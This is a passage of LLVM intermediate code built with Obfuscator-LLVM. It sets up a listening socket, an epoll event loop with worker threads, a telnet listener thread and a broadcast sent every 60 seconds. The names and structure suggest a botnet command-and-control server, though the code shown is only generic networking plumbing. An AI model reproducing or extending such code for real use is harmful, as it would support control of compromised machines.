  %47 = load volatile i32, i32* @listenFD, align 4
  %48 = icmp eq i32 %47, -1
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %41
  call void @abort() #10
  unreachable

; <label>:50:                                     ; preds = %41
  %51 = load volatile i32, i32* @listenFD, align 4
  %52 = call i32 @make_socket_non_blocking(i32 %51)
  store i32 %52, i32* %8, align 4
  %53 = load i32, i32* %8, align 4
  %54 = icmp eq i32 %53, -1
  br i1 %54, label %55, label %56

; <label>:55:                                     ; preds = %50
  call void @abort() #10
  unreachable

; <label>:56:                                     ; preds = %50
  %57 = load volatile i32, i32* @listenFD, align 4
  %58 = call i32 @listen(i32 %57, i32 128) #7
  store i32 %58, i32* %8, align 4
  %59 = load i32, i32* %8, align 4
  %60 = icmp eq i32 %59, -1
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %56
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.216, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:62:                                     ; preds = %56
  %63 = call i32 @epoll_create1(i32 0) #7
  store volatile i32 %63, i32* @epollFD, align 4
  %64 = load volatile i32, i32* @epollFD, align 4
  %65 = icmp eq i32 %64, -1
  br i1 %65, label %66, label %67

; <label>:66:                                     ; preds = %62
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.217, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:67:                                     ; preds = %62
  %68 = load volatile i32, i32* @listenFD, align 4
  %69 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %70 = bitcast %union.epoll_data* %69 to i32*
  store i32 %68, i32* %70, align 1
  %71 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %71, align 1
  %72 = load volatile i32, i32* @epollFD, align 4
  %73 = load volatile i32, i32* @listenFD, align 4
  %74 = call i32 @epoll_ctl(i32 %72, i32 1, i32 %73, %struct.epoll_event* %11) #7
  store i32 %74, i32* %8, align 4
  %75 = load i32, i32* %8, align 4
  %76 = icmp eq i32 %75, -1
  br i1 %76, label %77, label %78

; <label>:77:                                     ; preds = %67
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:78:                                     ; preds = %67
  %79 = load i32, i32* %9, align 4
  %80 = add nsw i32 %79, 2
  %81 = zext i32 %80 to i64
  %82 = call i8* @llvm.stacksave()
  store i8* %82, i8** %12, align 8
  %83 = alloca i64, i64 %81, align 16
  br label %84

; <label>:84:                                     ; preds = %88, %78
  %85 = load i32, i32* %9, align 4
  %86 = add nsw i32 %85, -1
  store i32 %86, i32* %9, align 4
  %87 = icmp ne i32 %85, 0
  br i1 %87, label %88, label %94

; <label>:88:                                     ; preds = %84
  %89 = load i32, i32* %9, align 4
  %90 = add nsw i32 %89, 1
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds i64, i64* %83, i64 %91
  %93 = call i32 @pthread_create(i64* %92, %union.pthread_attr_t* null, i8* (i8*)* @epollEventLoop, i8* null) #7
  br label %84

; <label>:94:                                     ; preds = %84
  %95 = getelementptr inbounds i64, i64* %83, i64 0
  %96 = load i32, i32* %10, align 4
  %97 = sext i32 %96 to i64
  %98 = inttoptr i64 %97 to i8*
  %99 = call i32 @pthread_create(i64* %95, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @telnetListener to i8* (i8*)*), i8* %98) #7
  br label %100

; <label>:100:                                    ; preds = %101, %94
  br label %101

; <label>:101:                                    ; preds = %100
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i32 -1, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.218, i32 0, i32 0))
  %102 = call i32 @sleep(i32 60)
  br label %100
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @create_and_bind(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 48, i32 8, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

; <label>:18:                                     ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 %20) #7
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.220, i32 0, i32 0), i8* %21)
  store i32 -1, i32* %2, align 4
  br label %76

; <label>:23:                                     ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

; <label>:25:                                     ; preds = %63, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %67

; <label>:28:                                     ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 %31, i32 %34, i32 %37) #7
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %28
  br label %63

; <label>:42:                                     ; preds = %28
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* %8, align 4
  %44 = bitcast i32* %9 to i8*
  %45 = call i32 @setsockopt(i32 %43, i32 1, i32 2, i8* %44, i32 4) #7
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %42
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.221, i32 0, i32 0))
  br label %48

; <label>:48:                                     ; preds = %47, %42
  %49 = load i32, i32* %8, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 5
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @bind(i32 %49, %struct.sockaddr* %52, i32 %55) #7
  store i32 %56, i32* %7, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

; <label>:59:                                     ; preds = %48
  br label %67

; <label>:60:                                     ; preds = %48
  %61 = load i32, i32* %8, align 4
  %62 = call i32 @close(i32 %61)
  br label %63

; <label>:63:                                     ; preds = %60, %41
  %64 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 7
  %66 = load %struct.addrinfo*, %struct.addrinfo** %65, align 8
  store %struct.addrinfo* %66, %struct.addrinfo** %6, align 8
  br label %25

; <label>:67:                                     ; preds = %59, %25
  %68 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %69 = icmp eq %struct.addrinfo* %68, null
  br i1 %69, label %70, label %73

; <label>:70:                                     ; preds = %67
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %71, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.222, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  br label %76

; <label>:73:                                     ; preds = %67
  %74 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %74) #7
  %75 = load i32, i32* %8, align 4
  store i32 %75, i32* %2, align 4
  br label %76

; <label>:76:                                     ; preds = %73, %70, %18
  %77 = load i32, i32* %2, align 4
  ret i32 %77
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #7

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #3

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind }
attributes #8 = { nounwind readonly }
attributes #9 = { nounwind readnone }
attributes #10 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
